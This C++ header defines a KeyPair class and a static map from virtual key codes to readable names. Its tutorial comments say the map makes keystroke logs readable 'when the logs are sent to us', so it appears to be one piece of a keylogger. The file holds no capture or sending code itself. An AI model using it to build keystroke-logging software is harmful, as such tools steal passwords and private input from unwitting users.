/*
/* In the C and C++ programming languages, an #include guard, sometimes called a macro guard, header guard or file guard,
/* is a particular construct used to avoid the problem of double inclusion when dealing
/* with the include directive.
*/

#ifndef KEYCONTRAINTS_H     //If not defined do... the following
#define KEYCONTRAINTS_H

#include <map>
/*
/* Maps are associative containers that store elements formed by a combination of a key value and a mapped value, following
/* a specific order. In a map, the key values are generally used to sort and uniquely identify the elements, while the mapped
/* values store the content associated to this key. its basically like an array with key value pairs.
/* Each value has a key that is used for accessing that particular value.
*/

#include <string>

class KeyPair
{
    public:
        KeyPair (const std::string &vk = "", const std::string &name = "") : VKName (vk), Name (name){} //constructor for this class
        /* After the colon (": VKName") we pre-initialise the variables created
        /*
        /* So basically here we have the constructor but the optional parameters
        /* will be initialised and form the KeyPairs Phases.
        */
        std::string VKName; //represents the Virtual Key name
        std::string Name;
};

class Keys  //This classed is used to store a map of keys that we get from the system.
/* We will use this map to map the (vk) virtual key code to human readable form that is logged to our text files
/* Thus making our forms readable when the logs are sent to us*/
{
    public:
        static std::map<int, KeyPair > KEYS;
};

#endif // KEYCONTRAINTS_H
